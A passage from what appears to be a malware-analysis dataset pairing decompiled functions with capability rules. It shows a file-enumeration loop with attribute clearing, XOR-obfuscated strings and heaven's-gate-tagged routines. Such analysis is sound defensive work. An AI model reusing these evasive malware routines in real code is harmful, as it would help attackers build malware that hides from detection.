((iVar7 = (*pcVar2)(&var_25ch, piVar5), \n                                          pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                          ((iVar7 = (*pcVar2)(&var_68h, piVar5), \n                                           pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                           (iVar7 = (*pcVar2)(&var_74h, piVar5), \n                                           pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)))))))) ||\n                                       (iVar7 = (*pcVar2)(&var_80h, piVar5), \n                                       pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)) ||\n                                      ((((iVar7 = (*pcVar2)(&var_2d8h, piVar5), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                         (iVar7 = (*pcVar2)(&var_8ch, piVar5), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)) ||\n                                        (iVar7 = (*pcVar2)(&var_2ech, piVar5), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)) ||\n                                       ((iVar7 = (*pcVar2)(&var_224h, piVar5), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                        (iVar7 = (*pcVar2)(&var_98h, piVar5), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)))))) ||\n                                     (((((iVar7 = (*pcVar2)(&var_a4h, piVar5), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                         ((iVar7 = (*pcVar2)(&var_b0h, piVar5), \n                                          pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                          (iVar7 = (*pcVar2)(&var_bch, piVar5), \n                                          pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)))) ||\n                                        (iVar7 = (*pcVar2)(&var_c8h, piVar5), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)) ||\n                                       (((iVar7 = (*pcVar2)(&var_230h, piVar5), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                         (iVar7 = (*pcVar2)(&var_d4h, piVar5), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)) ||\n                                        (iVar7 = (*pcVar2)(&var_e0h, piVar5), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)))) ||\n                                      ((((iVar7 = (*pcVar2)(&var_300h, piVar5), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                         (iVar7 = (*pcVar2)(&var_350h, piVar5), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)) ||\n                                        ((iVar7 = (*pcVar2)(&var_ech, piVar5), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                         ((iVar7 = (*pcVar2)(&var_f8h, piVar5), \n                                          pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                          (iVar7 = (*pcVar2)(&var_104h, piVar5), \n                                          pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)))))) ||\n                                       (((iVar7 = (*pcVar2)(&var_110h, piVar5), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                         ((((iVar7 = (*pcVar2)(&var_11ch, piVar5), \n                                            pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                            (iVar7 = (*pcVar2)(&var_128h, piVar5), \n                                            pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)) ||\n                                           (iVar7 = (*pcVar2)(&var_134h, piVar5), \n                                           pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)) ||\n                                          (((iVar7 = (*pcVar2)(&var_140h, piVar5), \n                                            pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                            (iVar7 = (*pcVar2)(&var_14ch, piVar5), \n                                            pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)) ||\n                                           ((iVar7 = (*pcVar2)(&var_158h, piVar5), \n                                            pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                            ((iVar7 = (*pcVar2)(&var_164h, piVar5), \n                                             pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                             (iVar7 = (*pcVar2)(&var_170h, piVar5), \n                                             pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)))))))))) ||\n                                        (iVar7 = (*pcVar2)(&var_17ch, piVar5), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)))))))) ||\n                                    ((((((iVar7 = (*pcVar2)(&var_188h, piVar5), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                         (iVar7 = (*pcVar2)(&var_194h, piVar5), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)) ||\n                                        (iVar7 = (*pcVar2)(&var_1a0h, piVar5), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)) ||\n                                       ((iVar7 = (*pcVar2)(&var_1ach, piVar5), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                        (iVar7 = (*pcVar2)(&var_1b8h, piVar5), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)))) ||\n                                      (iVar7 = (*pcVar2)(&var_1c4h, piVar5), \n                                      pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)) ||\n                                     (((iVar7 = (*pcVar2)(&var_1d0h, piVar5), \n                                       pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                       (iVar7 = (*pcVar2)(&var_1dch, piVar5), \n                                       pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)) ||\n                                      ((iVar7 = (*pcVar2)(&var_1e8h, piVar5), \n                                       pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                       ((iVar7 = (*pcVar2)(&var_1f4h, piVar5), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                        (iVar7 = (*pcVar2)(&var_314h, piVar5), \n                                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0))))))))))))\n                                goto code_r0x00411a02;\n                            }\n                            iVar7 = (*pcVar2)(&var_560h, &pszPath);\n                            pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW;\n                            if (((iVar7 == 0) ||\n                                (((iVar7 = (*pcVar2)(&var_23ch, &pszPath), \n                                  pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0 ||\n                                  (iVar7 = (*pcVar2)(&var_4a8h, &pszPath), \n                                  pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar7 == 0)) ||\n                                 (iVar7 = (*pcVar2)(&var_450h, &pszPath),  pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW\n                                 ,  iVar7 == 0)))) ||\n                               (((iVar7 = (*pcVar2)(&var_3c4h, &pszPath),  pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW\n                                 ,  iVar7 == 0 ||\n                                 (iVar7 = (*pcVar2)(&var_364h, &pszPath),  pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW\n                                 ,  iVar7 == 0)) ||\n                                (iVar7 = (*pcVar2)(&var_46ch, &pszPath),  pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW\n                                ,  iVar7 == 0)))) goto code_r0x00411a02;\n                        }\n                    }\n                    iVar4 = &var_9f8h - var_8h;\n                    piVar5 = var_8h;\n                    do {\n                        iVar1 = *piVar5;\n                        *(piVar5 + iVar4) = iVar1;\n                        piVar5 = piVar5 + 1;\n                    } while (iVar1 != 0);\n                    (*_sym.imp.SHLWAPI.dll_PathAddBackslashW)(&var_9f8h);\n                    uVar3 = var_7e8h;\n                    puVar9 = &pszPath;\n                    do {\n                        iVar1 = *puVar9;\n                        puVar9 = puVar9 + 2;\n                    } while (iVar1 != 0);\n                    uVar10 = puVar9 - &pszPath;\n                    puVar9 = auStack2558;\n                    do {\n                        piVar5 = puVar9 + 2;\n                        puVar9 = puVar9 + 2;\n                    } while (*piVar5 != 0);\n                    puVar11 = &pszPath;\n                    for (uVar8 = uVar10 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {\n                        *puVar9 = *puVar11;\n                        puVar11 = puVar11 + 1;\n                        puVar9 = puVar9 + 1;\n                    }\n                    for (uVar10 = uVar10 & 3; uVar10 != 0; uVar10 = uVar10 - 1) {\n                        *puVar9 = *puVar11;\n                        puVar11 = puVar11 + 1;\n                        puVar9 = puVar9 + 1;\n                    }\n                    pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW;\n                    iVar4 = var_4h;\n                    if (((uVar3 & 4) == 0) &&\n                       (((uVar3 & 1) == 0 ||\n                        (iVar7 = (*_sym.imp.KERNEL32.dll_SetFileAttributesW)(&var_9f8h, 0x80), \n                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar4 = var_4h,  iVar7 != 0)))) {\n                        fcn.00419500();\n                        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW;\n                        iVar4 = var_4h;\n                    }\n                }\n                else {\n                    iVar7 = (*pcVar2)(&pszPath, &var_3e0h);\n                    if ((((((iVar7 != 0) && (iVar7 = (*pcVar2)(&pszPath, &var_200h),  iVar7 != 0)) &&\n                          (iVar7 = (*pcVar2)(&pszPath, &var_2b0h),  iVar7 != 0)) &&\n                         ((iVar7 = (*pcVar2)(&pszPath, &var_3fch),  iVar7 != 0 &&\n                          (iVar7 = (*pcVar2)(&pszPath, &var_418h),  iVar7 != 0)))) &&\n                        (((iVar7 = (*pcVar2)(&pszPath, &var_394h),  iVar7 != 0 &&\n                          ((iVar7 = (*pcVar2)(&pszPath, &var_20h),  iVar7 != 0 &&\n                           (iVar7 = (*pcVar2)(&pszPath, &var_594h),  iVar7 != 0)))) &&\n                         (iVar7 = (*pcVar2)(&pszPath, &var_2c4h),  iVar7 != 0)))) &&\n                       (((((((iVar7 = (*pcVar2)(&pszPath, &var_24ch),  iVar7 != 0 &&\n                             (iVar7 = (*pcVar2)(&pszPath, &var_4ech),  iVar7 != 0)) &&\n                            (iVar7 = (*pcVar2)(&pszPath, &var_26ch),  iVar7 != 0)) &&\n                           ((iVar7 = (*pcVar2)(&pszPath, &var_3ach),  iVar7 != 0 &&\n                            (iVar7 = (*pcVar2)(&pszPath, &var_27ch),  iVar7 != 0)))) &&\n                          ((iVar7 = (*pcVar2)(&pszPath, &var_37ch),  iVar7 != 0 &&\n                           ((iVar7 = (*pcVar2)(&pszPath, &var_28ch),  iVar7 != 0 &&\n                            (iVar7 = (*pcVar2)(&pszPath, &var_328h),  iVar7 != 0)))))) &&\n                         (iVar7 = (*pcVar2)(&pszPath, &var_33ch),  iVar7 != 0)) &&\n                        ((((iVar7 = (*pcVar2)(&pszPath, &var_29ch),  iVar7 != 0 &&\n                           (iVar7 = (*pcVar2)(&pszPath, &var_488h),  iVar7 != 0)) &&\n                          (iVar7 = (*pcVar2)(&pszPath, &var_510h),  iVar7 != 0)) &&\n                         (((iVar7 = (*pcVar2)(&pszPath, &var_534h),  iVar7 != 0 &&\n                           (iVar7 = (*pcVar2)(&pszPath, &var_434h),  iVar7 != 0)) &&\n                          ((iVar7 = (*pcVar2)(&pszPath, &var_20ch),  iVar7 != 0 &&\n                           (iVar7 = (*pcVar2)(&pszPath, &var_4c8h),  iVar7 != 0)))))))))) {\n                        (*_sym.imp.USER32.dll_wsprintfW)(&lpFileName, &var_218h, var_8h, &pszPath);\n                        fcn.00410530();\n                    }\n                }\n            }\ncode_r0x00411a02:\n            iVar7 = (*pcVar12)(iVar4, &var_7e8h);\n        } while (iVar7 == 1);\n        (*_sym.imp.KERNEL32.dll_FindClose)(iVar4);\n    }\n    return;\n}\n",
        "token_count": 11835
    },
    "00407640": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00407640(uint *param_1)\n\n{\n    *param_1 = 0x360065;\n    param_1[1] = 0x3000a;\n    param_1[2] = 0x120011;\n    param_1[3] = 0x170004;\n    param_1[4] = 0x390000;\n    param_1[5] = 0xc0028;\n    param_1[6] = 0x170006;\n    param_1[7] = 0x16000a;\n    param_1[8] = 0x3000a;\n    param_1[9] = 0x390011;\n    param_1[10] = 0xc0032;\n    param_1[0xb] = 0x1000b;\n    param_1[0xc] = 0x12000a;\n    param_1[0xd] = 0x450016;\n    param_1[0xe] = 0x31002b;\n    param_1[0xf] = 0x260039;\n    param_1[0x10] = 0x170010;\n    param_1[0x11] = 0x17;\n    param_1[0x12] = 0x11000b;\n    param_1[0x13] = 0x33;\n    param_1[0x14] = 0x160017;\n    param_1[0x15] = 0xa000c;\n    param_1[0x16] = 0x39000b;\n    param_1[0x17] = 0x26002c;\n    param_1[0x18] = 0x390028;\n    param_1[0x19] = 0x40026;\n    param_1[0x1a] = 0xc0009;\n    param_1[0x1b] = 0x170007;\n    param_1[0x1c] = 0x110004;\n    param_1[0x1d] = 0xa000c;\n    param_1[0x1e] = 0x65000b;\n    *(param_1 + 0x1f) = *0x423a5a ^ 0x65;\n    *(param_1 + 0x7e) = *0x423a5c ^ 0x65;\n    *(param_1 + 0x20) = *0x423a5c >> 0x10 ^ 0x65;\n    *(param_1 + 0x82) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._0_4_ ^ 0x65;\n    *(param_1 + 0x21) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._0_4_ >> 0x10 ^ 0x65;\n    *(param_1 + 0x86) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._4_4_ ^ 0x65;\n    *(param_1 + 0x22) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._4_4_ >> 0x10 ^ 0x65;\n    *(param_1 + 0x8a) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._8_4_ ^ 0x65;\n    *(param_1 + 0x23) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._8_4_ >> 0x10 ^ 0x65;\n    *(param_1 + 0x8e) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._12_4_ ^ 0x65;\n    *(param_1 + 0x24) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._12_4_ >> 0x10 ^ 0x65;\n    *(param_1 + 0x92) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._16_4_ ^ 0x65;\n    *(param_1 + 0x25) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._16_4_ >> 0x10 ^ 0x65;\n    *(param_1 + 0x96) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._20_4_ ^ 0x65;\n    *(param_1 + 0x26) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._20_4_ >> 0x10 ^ 0x65;\n    *(param_1 + 0x9a) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._24_4_ ^ 0x65;\n    *(param_1 + 0x27) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._24_4_ >> 0x10 ^ 0x65;\n    *(param_1 + 0x9e) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._28_4_ ^ 0x65;\n    *(param_1 + 0x28) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._28_4_ >> 0x10 ^ 0x65;\n    *(param_1 + 0xa2) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._32_4_ ^ 0x65;\n    *(param_1 + 0x29) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._32_4_ >> 0x10 ^ 0x65;\n    *(param_1 + 0xa6) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._36_4_ ^ 0x65;\n    *(param_1 + 0x2a) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._36_4_ >> 0x10 ^ 0x65;\n    *(param_1 + 0xaa) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._40_4_ ^ 0x65;\n    *(param_1 + 0x2b) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._40_4_ >> 0x10 ^ 0x65;\n    *(param_1 + 0xae) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._44_4_ ^ 0x65;\n    *(param_1 + 0x2c) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._44_4_ >> 0x10 ^ 0x65;\n    *(param_1 + 0xb2) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._48_4_ ^ 0x65;\n    *(param_1 + 0x2d) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._48_4_ >> 0x10 ^ 0x65;\n    *(param_1 + 0xb6) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._52_4_ ^ 0x65;\n    *(param_1 + 0x2e) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._52_4_ >> 0x10 ^ 0x65;\n    *(param_1 + 0xba) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._56_4_ ^ 0x65;\n    *(param_1 + 0x2f) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._56_4_ >> 0x10 ^ 0x65;\n    *(param_1 + 0xbe) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._60_4_ ^ 0x65;\n    *(param_1 + 0x30) = str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937._60_4_ >> 0x10 ^ 0x65;\n    *(param_1 + 0xc2) = *param_1 ^ str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[32];\n    *(param_1 + 0x31) = *param_1 ^ str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[33];\n    *(param_1 + 0xc6) = *param_1 ^ str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[34];\n    *(param_1 + 0x32) = *param_1 ^ str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[35];\n    *(param_1 + 0xca) = *param_1 ^ str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[36];\n    *(param_1 + 0x33) = *param_1 ^ str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[37];\n    *(param_1 + 0xce) = *param_1 ^ str.D2E7041B_2927_42fb_8E9F_7CE93B6DC937[38];\n    *(param_1 + 0x34) = *param_1 ^ *0x423aae;\n    *(param_1 + 0xd2) = *param_1 ^ *0x423ab0;\n    *(param_1 + 0x35) = *param_1 ^ *0x423ab2;\n    *(param_1 + 0xd6) = *param_1 ^ *0x423ab4;\n    *(param_1 + 0x36) = *param_1 ^ *0x423ab6;\n    *(param_1 + 0xda) = *param_1 ^ *0x423ab8;\n    *(param_1 + 0x37) = *param_1 ^ *0x423aba;\n    *(param_1 + 0xde) = *param_1 ^ *0x423abc;\n    *(param_1 + 0x38) = *param_1 ^ *0x423abe;\n    *(param_1 + 0xe2) = *param_1 ^ *0x423ac0;\n    *(param_1 + 0x39) = *param_1 ^ *0x423ac2;\n    *(param_1 + 0xe6) = *param_1 ^ *0x423ac4;\n    *(param_1 + 0x3a) = *param_1 ^ *0x423ac6;\n    *(param_1 + 0xea) = *param_1 ^ *0x423ac8;\n    *(param_1 + 0x3b) = *param_1 ^ *0x423aca;\n    *(param_1 + 0xee) = *param_1 ^ *0x423acc;\n    *(param_1 + 0x3c) = *param_1 ^ *0x423ace;\n    *(param_1 + 0xf2) = *param_1 ^ *0x423ad0;\n    *(param_1 + 0x3d) = 0;\n    return param_1;\n}\n",
        "token_count": 3002
    },
    "00412b40": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.00412b40(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint uVar5;\n    uint uVar6;\n    ushort extraout_var;\n    code *pcVar7;\n    ushort extraout_var_00;\n    uint32_t uVar8;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint8_t *puVar9;\n    ushort in_GS;\n    int32_t in_FS_OFFSET;\n    ulong uVar10;\n    uchar uStack0000000b;\n    uchar uStack0000000d;\n    uchar uStack0000000e;\n    uchar uStack0000000f;\n    uchar uStack00000011;\n    uchar uStack00000012;\n    uchar uStack00000013;\n    uchar uStack00000015;\n    uchar uStack00000016;\n    uchar uStack00000017;\n    uchar uStack00000019;\n    uchar uStack0000001a;\n    uchar uStack0000001b;\n    uchar uStack0000001d;\n    uchar uStack0000001e;\n    uchar uStack0000001f;\n    uchar uStack00000021;\n    uchar uStack00000022;\n    uchar uStack00000023;\n    uchar uStack00000025;\n    uchar uStack00000026;\n    uchar uStack00000027;\n    uchar uStack00000029;\n    uchar uStack0000002a;\n    uchar uStack0000002b;\n    uchar uStack0000002d;\n    uchar uStack0000002e;\n    uchar uStack0000002f;\n    uchar uStack00000031;\n    uchar uStack00000032;\n    uchar uStack00000033;\n    uchar uStack00000035;\n    uchar uStack00000036;\n    uchar uStack00000037;\n    uchar uStack00000039;\n    uchar uStack0000003a;\n    uchar uStack0000003b;\n    uchar uStack0000003d;\n    uchar uStack0000003e;\n    uchar uStack0000003f;\n    uchar uStack00000041;\n    uchar uStack00000042;\n    uchar uStack00000043;\n    uchar uStack00000045;\n    uchar uStack00000046;\n    uchar uStack00000047;\n    uchar uStack00000049;\n    uchar uStack0000004a;\n    uchar uStack0000004b;\n    uchar uStack0000004d;\n    uchar uStack0000004e;\n    uchar uStack0000004f;\n    uchar uStack00000051;\n    uchar uStack00000052;\n    uchar uStack00000053;\n    uchar uStack00000055;\n    uchar uStack00000056;\n    uchar uStack00000057;\n    uchar uStack00000059;\n    uchar uStack0000005a;\n    uchar uStack0000005b;\n    uchar uStack0000005d;\n    uchar uStack0000005e;\n    uchar uStack0000005f;\n    uchar uStack00000061;\n    uchar uStack00000062;\n    uchar uStack00000063;\n    uchar uStack00000065;\n    uchar uStack00000066;\n    uchar uStack00000067;\n    uchar uStack00000069;\n    uchar uStack0000006a;\n    uchar uStack0000006b;\n    uchar uStack0000006d;\n    uchar uStack0000006e;\n    uchar uStack0000006f;\n    uchar uStack00000071;\n    uchar uStack00000072;\n    uchar uStack00000073;\n    uchar uStack00000075;\n    uchar uStack00000076;\n    uchar uStack00000077;\n    uchar uStack00000079;\n    uchar uStack0000007a;\n    uchar uStack0000007b;\n    uchar uStack0000007d;\n    uchar uStack0000007e;\n    uchar uStack0000007f;\n    uchar uStack00000081;\n    uchar uStack00000082;\n    uchar uStack00000083;\n    uchar uStack00000085;\n    uchar uStack00000086;\n    uchar uStack00000087;\n    uchar uStack00000089;\n    uchar uStack0000008a;\n    uchar uStack0000008b;\n    uchar uStack0000008d;\n    uchar uStack0000008e;\n    uchar uStack0000008f;\n    uchar uStack00000091;\n    uchar uStack00000092;\n    uchar uStack00000093;\n    uchar uStack00000095;\n    uchar uStack00000096;\n    uchar uStack00000097;\n    uchar uStack00000099;\n    uchar uStack0000009a;\n    uchar uStack0000009b;\n    uchar uStack0000009d;\n    uchar uStack0000009e;\n    uchar uStack0000009f;\n    uchar uStack000000a1;\n    uchar uStack000000a2;\n    uchar uStack000000a3;\n    uchar uStack000000a5;\n    uchar uStack000000a6;\n    uchar uStack000000a7;\n    uchar uStack000000a9;\n    uchar uStack000000b1;\n    uchar uStack000000b2;\n    uchar uStack000000b3;\n    uchar uStack000000b5;\n    uchar uStack000000b6;\n    uchar uStack000000b7;\n    uchar uStack000000b9;\n    uchar uStack000000c2;\n    uchar uStack000000c3;\n    uchar uStack000000c5;\n    uchar uStack000000c6;\n    uchar uStack000000c7;\n    uchar uStack000000c9;\n    uchar uStack000000ca;\n    uchar uStack000000cb;\n    uchar uStack000000d5;\n    uchar uStack000000d6;\n    uchar uStack000000d7;\n    uchar uStack000000d9;\n    uchar uStack000000da;\n    uchar uStack000000db;\n    uchar uStack000000dd;\n    uchar uStack000000de;\n    uchar uStack000000df;\n    uchar uStack000000e5;\n    uchar uStack000000e6;\n    uchar uStack000000e7;\n    uchar uStack000000e9;\n    uchar uStack000000ea;\n    uchar uStack000000eb;\n    uchar uStack000000ed;\n    uchar uStack000000ee;\n    uchar uStack000000ef;\n    uchar uStack000000f1;\n    uchar uStack000000f2;\n    uchar uStack000000f3;\n    uchar uStack000000f5;\n    uchar uStack000000f6;\n    uchar uStack000000f7;\n    uchar uStack000000f9;\n    uchar uStack000000fa;\n    uchar uStack000000fb;\n    uchar uStack000000fd;\n    uchar uStack000000fe;\n    uchar uStack000000ff;\n    uchar uStack00000101;\n    uchar uStack00000102;\n    uchar uStack00000103;\n    uchar uStack00000105;\n    uchar uStack00000106;\n    uchar uStack00000107;\n    uchar uStack00000109;\n    uchar uStack0000010a;\n    uchar uStack0000010b;\n    uchar uStack0000010d;\n    uchar uStack0000010e;\n    uchar uStack0000010f;\n    uchar uStack00000111;\n    uchar uStack00000112;\n    uchar uStack00000113;\n    uchar uStack00000115;\n    uchar uStack00000116;\n    uchar uStack00000117;\n    uchar uStack00000119;\n    uchar uStack0000011a;\n    uchar uStack0000011b;\n    uchar uStack0000011d;\n    uchar uStack0000011e;\n    uchar uStack0000011f;\n    uchar uStack00000121;\n    uchar uStack00000122;\n    uchar uStack00000123;\n    uchar uStack00000125;\n    uchar uStack00000126;\n    uchar uStack00000127;\n    uchar uStack00000129;\n    uchar uStack0000012a;\n    uchar uStack0000012b;\n    uchar uStack0000012d;\n    uchar uStack0000012e;\n    uint32_t uStack0000012f;\n    uint uStack00000133;\n    uint uStack00000137;\n    uchar uStack0000013b;\n    uchar in_stack_0000013c;\n    uchar uStack0000013d;\n    uchar uStack0000013e;\n    uchar uStack0000013f;\n    uchar in_stack_00000140;\n    uchar uStack00000141;\n    uchar uStack00000142;\n    uchar uStack00000143;\n    uchar in_stack_00000144;\n    uchar uStack00000145;\n    uchar uStack00000146;\n    uchar uStack00000147;\n    uchar in_stack_00000148;\n    uchar uStack00000149;\n    uint in_stack_00000154;\n    uint in_stack_00000158;\n    uint in_stack_0000015c;\n    uchar in_stack_00000160;\n    ushort uStack00000164;\n    uint in_stack_00000164;\n    uchar in_stack_00000168;\n    uchar uStack00000169;\n    uchar uStack0000016a;\n    uchar uStack0000016b;\n    uchar in_stack_0000016c;\n    uchar uStack0000016e;\n    uchar uStack0000016f;\n    ushort in_stack_00000170;\n    ushort uStack00000172;\n    ushort in_stack_00000174;\n    ushort uStack00000176;\n    ushort in_stack_00000178;\n    uchar uStack0000017a;\n    uchar uStack0000017b;\n    uint in_stack_0000017c;\n    ushort uStack00000180;\n    uint in_stack_00000180;\n    uint in_stack_00000184;\n    uchar uStack00000188;\n    unkbyte3 Stack00000188;\n    uint32_t in_stack_00000188;\n    uint in_stack_0000018c;\n    uint in_stack_00000190;\n    uint32_t in_stack_00000194;\n    uint in_stack_00000198;\n    uchar in_stack_0000019c;\n    uchar uStack0000019d;\n    uchar uStack0000019e;\n    uchar uStack0000019f;\n    uchar in_stack_000001a0;\n    uchar uStack000001a1;\n    uchar uStack000001a2;\n    uchar uStack000001a3;\n    uchar in_stack_000001a4;\n    uchar uStack000001a5;\n    ushort uStack000001a6;\n    ushort in_stack_000001a8;\n    ushort uStack000001aa;\n    uint32_t in_stack_000001ac;\n    uint in_stack_000001b0;\n    uint in_stack_000001b4;\n    uint in_stack_000001b8;\n    uint in_stack_000001bc;\n    uint in_stack_000001c4;\n    uchar in_stack_000001c8;\n    uchar uStack000001c9;\n    ushort uStack000001ca;\n    uint in_stack_000001cc;\n    uchar in_stack_000001d0;\n    uint uStack000001d1;\n    ushort uStack000001d5;\n    uchar uStack000001d7;\n    uint in_stack_000001d8;\n    uint in_stack_000001dc;\n    uint in_stack_000001e0;\n    ushort in_stack_000001e4;\n    uchar uStack000001e6;\n    uint uStack000001e7;\n    uint uStack000001eb;\n    uint uStack000001ef;\n    ushort uStack000001f3;\n    uchar uStack000001f5;\n    int32_t iVar11;\n    int32_t in_stack_000006ec;\n    \n    fcn.00407df0();\n    fcn.004125c0();\n    uStack0000002d = 0x77;\n    uStack0000002e = 0x72;\n    uStack000000c2 = 0x1f;\n    uStack00000031 = 0x70;\n    uStack0000002f = 0x61;\n    uStack00000032 = 0x65;\n    uStack00000033 = 0x72;\n    uStack000000c3 = 0x44;\n    uStack000000c5 = 0x66;\n    uStack000000c6 = 0x57;\n    uStack000000c7 = 0x61;\n    uStack000000c9 = 99;\n    uStack000000ca = 0x68;\n    uStack0000005a = 99;\n    uStack00000059 = 99;\n    uStack0000005b = 0x45;\n    uStack0000005d = 0x74;\n    uStack000000cb = 0;\n    uStack0000005e = 0x4d;\n    uStack0000005f = 0x67;\n    uStack00000099 = 99;\n    uStack0000009a = 99;\n    uStack0000009f = 0x67;\n    uStack0000009b = 0x53;\n    uStack0000009d = 0x74;\n    uStack00000035 = 0x57;\n    uStack0000009e = 0x4d;\n    uStack00000036 = 0x53;\n    uStack00000037 = 0x61;\n    uStack00000022 = 9;\n    uStack00000039 = 0x52;\n    uStack0000003b = 0x61;\n    uStack0000003a = 